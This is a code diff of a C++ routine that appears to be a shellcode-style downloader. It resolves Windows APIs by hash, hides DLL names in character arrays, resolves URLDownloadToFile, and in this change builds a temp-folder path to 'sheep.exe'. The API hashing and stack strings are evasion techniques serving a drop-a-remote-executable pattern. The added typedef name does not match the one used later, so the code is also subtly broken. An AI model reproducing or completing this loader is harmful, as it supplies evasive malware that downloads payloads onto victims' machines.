@@ -54,6 +54,7 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
 typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
+typedef DWORD (* GetTempPath2AHeader)(DWORD, LPSTR);
 typedef void * (* mallocHeader)(std::size_t);
 typedef void * (* reallocHeader)(void *, std::size_t);
 typedef void (* freeHeader)(void *);
@@ -385,6 +386,7 @@ int callout(void)
       return 1;
 
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
+   GetTempPath2Header getTempPath2 = reinterpret_cast<GetTempPath2Header>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x7994452b));
    char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
    PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
    URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xe6c2ead5));
@@ -399,10 +401,13 @@ int callout(void)
    memcpyHeader memcpy = reinterpret_cast<memcpyHeader>(get_proc_by_hash(msvcrtModule, 0xa45cec64));
 
    char temp_path[MAX_PATH+1];
-   char slash[] = {'\\', 0};
+   char slash_sheep[] = {'\\','s','h','e','e','p','.','e','x','e',0};
 
-   std::wcout << "GetTempPath2A: " << std::hex << fnv321a("GetTempPath2A") << std::endl;
+   getTempPath2(MAX_PATH, temp_path);
+   strncat(temp_path, slash_sheep, strlen(slash_sheep));
 
+   std::wcout << "GetFileAttributesA: " << std::hex << fnv321a("GetFileAttributesA") << std::endl;
+   
    return 0;
 }
 
